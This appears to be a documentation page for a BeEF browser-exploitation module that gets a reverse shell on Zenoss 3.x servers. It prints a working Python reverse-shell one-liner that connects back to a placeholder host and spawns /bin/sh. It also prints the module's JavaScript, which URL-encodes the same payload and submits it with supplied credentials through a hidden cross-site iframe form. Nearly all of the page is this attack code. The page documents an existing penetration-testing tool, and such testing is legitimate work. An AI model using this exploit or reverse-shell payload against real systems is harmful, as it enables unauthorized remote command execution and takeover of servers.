## Summary

* **Objective**: get a reverse shell on a Zenoss 3.x server. Valid credentials are required.
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/zenoss_3x_command_execution)

## Internal Working

With valid credentials, send a POST request through an iframe to execute a reverse shell.

The payload is a python reverse shell executed in the shell

```bash
python -c \"import socket,subprocess,os;host=\\\"1.2.3.4\\\";port=4444;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\"
```

```js
  var rhost = '<%= @rhost %>';
  var rport = '<%= @rport %>';
  var lhost = '<%= @lhost %>';
  var lport = '<%= @lport %>';
  var user  = '<%= @user  %>';
  var pass  = '<%= @pass  %>';
  var target  = 'http://'+rhost+':'+rport+'/zport/About/showDaemonXMLConfig'

  // reverse python payload
  var payload = unescape('%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%68%6f%73%74%3d%5c%22'+lhost+'%5c%22%3b%70%6f%72%74%3d'+lport+'%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%68%6f%73%74%2c%70%6f%72%74%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%5c%22%2f%62%69%6e%2f%73%68%5c%22%2c%5c%22%2d%69%5c%22%5d%29%3b%22')

  // send request
  var zenoss_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(target, "POST", "application/x-www-form-urlencoded", [
    {'type':'hidden', 'name':'__ac_name',     'value':user},
    {'type':'hidden', 'name':'__ac_password', 'value':pass},
    {'type':'hidden', 'name':'daemon',        'value':payload}
  ]);
```

## Feedback
